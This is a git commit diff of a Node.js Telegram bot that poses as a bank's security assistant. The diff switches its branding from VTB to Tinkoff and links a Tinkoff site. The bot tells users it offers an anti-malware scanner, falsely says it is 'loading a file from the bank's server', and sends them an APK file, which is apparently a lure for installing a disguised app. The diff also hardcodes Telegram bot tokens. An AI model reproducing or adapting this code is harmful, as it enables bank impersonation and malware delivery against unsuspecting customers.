82f0ba96920d831a0196a1693e16a757cd117ea3
BloodRik <124177587+BloodRik@users.noreply.github.com>
2023-12-08 08:39:15 +0200

    kjhg

--- api/index.js
+++ api/index.js
@@ -1,62 +1,55 @@
 const TelegramBot = require("node-telegram-bot-api");
 
-const token = "6727445119:AAFpR3Hk_JBOevOkbCQm-LSouskqB1RMxhk";
+const token = "6933852086:AAHxCNPJN0mMY9lEc4OrlfATkqR2Z3hOpqo";
 const bot = new TelegramBot(token, { polling: true });
-const webApiUrl = 'https://vtb-service-client.vercel.app/'
+const webApiUrl = 'https://www.tinkoff.ru/'
 
-bot.onText(/\/start/, async (msg) => {
+bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
-  const gifFilePath = './320_180.gif.gif';
+  const gifFilePath = 'tinkoff-logo.gif';
 
-  try {
-    await bot.sendDocument(chatId, gifFilePath, {
-      caption: `Привет! Я — Помощник ВТБ.
+  bot.sendDocument(chatId, gifFilePath, {
+    caption: `Привет! Я — Помощник Тинькофф.
 
 Бот предназначен для помощи клиентов по решению проблем с безопасностью.
 
 В нем можно скачать приложение, которое сканирует на наличие вредоносных программ
 и различных мошеннических действий на вашем устройстве`,
-      reply_markup: {
-        inline_keyboard: [
-          [
-            {
-              text: 'Сайт',
-              web_app: { url: webApiUrl }
-            },
-            {
-              text: 'Файл',
-              callback_data: 'file'
-            }
-          ]
+    reply_markup: {
+      inline_keyboard: [
+        [
+          {
+            text: 'Сайт',
+            web_app: {url: webApiUrl}
+          },
+          {
+            text: 'Файл',
+            callback_data: 'file'
+          }
         ]
-      }
-    });
-  } catch (error) {
-    console.error('Ошибка отправки документа:', error);
-  }
+      ]
+    }
+  });
 });
 
-bot.on('callback_query', async (query) => {
+bot.on('callback_query', (query) => {
   const chatId = query.message.chat.id;
   const data = query.data;
 
   if (data === 'file') {
-    try {
-      await bot.sendMessage(chatId, 'Загрузка файла с сервера банка...🌐');
-      await sendFile(chatId);
-    } catch (error) {
-      console.error('Ошибка при обработке callback-запроса:', error);
-    }
+    bot.sendMessage(chatId, 'Загрузка файла с сервера банка...🌐');
+    sendFile(chatId);
   }
 });
 
-async function sendFile(chatId) {
-  const filePath = 'support-vtb-client.apk';
+function sendFile(chatId) {
+  const filePath = 'support-tinkoff-client.apk';
 
-  try {
-    await bot.sendDocument(chatId, filePath);
-    console.log(`Файл успешно отправлен пользователю с chatId ${chatId}`);
-  } catch (error) {
-    console.error('Ошибка отправки файла:', error);
-  }
+  bot.sendDocument(chatId, filePath)
+    .then(() => {
+      console.log(`Файл успешно отправлен пользователю с chatId ${chatId}`);
+    })
+    .catch((error) => {
+      console.error('Ошибка отправки файла:', error);
+    });
 }
